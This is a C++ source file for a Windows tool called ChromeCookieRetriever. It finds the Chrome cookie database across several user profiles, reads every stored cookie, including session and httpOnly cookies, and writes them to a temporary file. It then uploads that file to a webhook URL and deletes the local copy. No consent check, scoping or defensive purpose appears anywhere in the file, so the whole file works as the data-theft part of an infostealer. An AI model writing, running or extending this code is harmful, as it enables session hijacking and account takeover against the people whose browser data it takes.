#include "chrome_cookie_retriever.hpp"
#include <iostream>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <algorithm>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <thread>
#include <chrono>
#include <filesystem>

namespace cookie_retriever {

// Helper function to format cookies as JSON
std::string format_cookies_as_json(const std::vector<Cookie>& cookies) {
    nlohmann::json json_array = nlohmann::json::array();

    for (const auto& cookie : cookies) {
        nlohmann::json cookie_obj;
        cookie_obj["domain"] = cookie.domain;
        cookie_obj["name"] = cookie.name;
        cookie_obj["value"] = cookie.value;
        cookie_obj["path"] = cookie.path;
        cookie_obj["expirationDate"] = static_cast<double>(cookie.expires_utc) / 1000000.0 - 11644473600.0;
        cookie_obj["secure"] = cookie.secure;
        cookie_obj["httpOnly"] = cookie.http_only;
        cookie_obj["sameSite"] = "lax";  // Default to "lax" as it's the most common
        
        json_array.push_back(cookie_obj);
    }

    return json_array.dump(2);
}

ChromeCookieRetriever::ChromeCookieRetriever(const std::string& webhook_url) 
    : webhook_url_(webhook_url),
      webhook_sender_(nullptr),
      chrome_cookie_path(""),
      temp_db_path("") {
    try {
        if (!webhook_url.empty()) {
            webhook_sender_ = std::make_unique<WebhookSender>(webhook_url);
        }
    } catch (const std::exception& e) {
        std::cerr << "Error initializing webhook sender: " << e.what() << std::endl;
        throw;
    }
}

ChromeCookieRetriever::~ChromeCookieRetriever() {
    try {
        if (!temp_db_path.empty() && std::filesystem::exists(temp_db_path)) {
            cleanup_temp_db(temp_db_path);
        }
    } catch (...) {
        // Ignore cleanup errors
    }
}

bool ChromeCookieRetriever::is_chrome_running() const {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create process snapshot" << std::endl;
        return false;
    }

    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &processEntry)) {
        CloseHandle(snapshot);
        std::cout << "Failed to get first process" << std::endl;
        return false;
    }

    bool found = false;
    do {
        std::wstring processName(processEntry.szExeFile);
        std::wcout << L"Checking process: " << processName << std::endl;
        if (processName == L"chrome.exe") {
            found = true;
            break;
        }
    } while (Process32NextW(snapshot, &processEntry));

    CloseHandle(snapshot);
    std::cout << "Chrome " << (found ? "is" : "is not") << " running" << std::endl;
    return found;
}

std::string ChromeCookieRetriever::get_chrome_cookie_path() const {
    char local_appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata))) {
        throw std::runtime_error("Failed to get local appdata path");
    }

    std::vector<std::string> possible_paths = {
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\Cookies",
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\Cookies",
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\Cookies",
        std::string(local_appdata) + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\Cookies"
    };

    std::cout << "Checking Chrome profiles:" << std::endl;
    for (size_t i = 0; i < possible_paths.size(); ++i) {
        std::cout << i + 1 << ". " << possible_paths[i] << std::endl;
        if (std::filesystem::exists(possible_paths[i])) {
            std::cout << "Found cookies database in profile " << i + 1 << std::endl;
            return possible_paths[i];
        }
    }

    throw std::runtime_error("Chrome cookie database not found in any profile");
}

std::vector<Cookie> ChromeCookieRetriever::get_all_cookies() {
    retrieve_cookies("");
    return {};
}

void ChromeCookieRetriever::retrieve_cookies(const std::string& domain_pattern) {
    std::string cookie_path = get_chrome_cookie_path();
    
    sqlite3* db;
    if (sqlite3_open(cookie_path.c_str(), &db) != SQLITE_OK) {
        return;
    }

    std::vector<Cookie> all_cookies;
    std::string query = "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly "
                       "FROM cookies";

    sqlite3_stmt* stmt = nullptr;
    sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        Cookie cookie;
        cookie.domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        cookie.name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        cookie.value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        cookie.path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        cookie.expires_utc = sqlite3_column_int64(stmt, 4);
        cookie.secure = sqlite3_column_int(stmt, 5) != 0;
        cookie.http_only = sqlite3_column_int(stmt, 6) != 0;
        all_cookies.push_back(cookie);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    if (!all_cookies.empty()) {
        std::string cookies_json = format_cookies_as_json(all_cookies);
        send_cookies_to_webhook(cookies_json);
    }
}

void ChromeCookieRetriever::cleanup_temp_db(const std::string& temp_path) const {
    try {
        if (std::filesystem::exists(temp_path)) {
            std::filesystem::remove(temp_path);
        }
    } catch (...) {
        // Ignore cleanup errors
    }
}

void ChromeCookieRetriever::send_cookies_to_webhook(const std::string& cookies_json) {
    if (!webhook_sender_) {
        return;
    }

    try {
        // Create temporary directory path
        char temp_path[MAX_PATH];
        DWORD temp_path_len = GetTempPathA(MAX_PATH, temp_path);
        if (temp_path_len == 0 || temp_path_len > MAX_PATH) {
            throw std::runtime_error("Failed to get temp path");
        }

        // Generate unique filename
        std::string json_path = std::string(temp_path) + "cookies_" + std::to_string(GetTickCount64()) + ".txt";

        // Write JSON file with pretty formatting
        {
            std::ofstream json_file(json_path);
            if (!json_file.is_open()) {
                throw std::runtime_error("Failed to create JSON file: " + json_path);
            }
            
            json_file << "=== Chrome Cookie Report ===\n\n";
            json_file << cookies_json;
            json_file.close();
        }

        // Send file
        if (!webhook_sender_->send_file(json_path, "cookies.txt", "text/plain")) {
            throw std::runtime_error("Failed to send file");
        }

        // Clean up temporary file
        std::remove(json_path.c_str());

    } catch (const std::exception& e) {
        std::cerr << "Error sending cookies file: " << e.what() << std::endl;
    }
}

} // namespace cookie_retriever
